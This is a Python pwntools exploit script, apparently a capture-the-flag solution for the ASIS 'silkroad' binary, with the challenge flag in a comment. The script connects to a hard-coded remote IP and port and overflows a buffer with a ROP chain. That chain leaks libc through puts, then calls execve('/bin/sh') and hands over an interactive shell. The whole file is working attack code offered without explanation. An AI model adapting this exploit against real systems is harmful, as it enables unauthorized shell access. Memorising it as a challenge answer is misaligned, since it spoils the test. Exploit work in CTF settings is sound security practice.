#!/usr/bin/env python
# encoding: utf-8
# ASIS{t0ken1Z3_mE_pleas3_1N_SilKr04D!!}
__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './silkroad.elf'
TARGET = ('82.196.10.106', 58399)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

code = ELF(BINARY)
libc = ELF(LIBC64)
#attach(0x401873)

secret = '790317143'
r.sendlineafter('Enter your secret ID: ', secret)
nickname = 'DreadPirateRoberts_' + '\x69\x7a\x00'
r.sendafter('Enter your nick: ', nickname)

payload  = 'a'*0x40
payload += 'b'*8
payload += p64(0x401BAB)
payload += p64(0x404038)
payload += p64(0x401070)
payload += p64(0x401150)
r.sendlineafter('run Silkroad!\n', payload)

libc.address = u64(r.recvline().strip() + '\x00\x00') - libc.sym['puts']
log.info('libc.address %#x' % libc.address)

secret = '790317143'
r.sendlineafter('Enter your secret ID: ', secret)
nickname = 'DreadPirateRoberts_' + '\x69\x7a\x00'
r.sendafter('Enter your nick: ', nickname)

payload  = 'a'*0x40
payload += 'b'*8
payload += p64(0x401BAB)
payload += p64(libc.search('/bin/sh\x00').next())
payload += p64(libc.address + 0x1306D9 )
payload += p64(0)
payload += p64(0)
payload += p64(libc.sym['execve'])

r.sendlineafter('run Silkroad!\n', payload)

r.interactive()
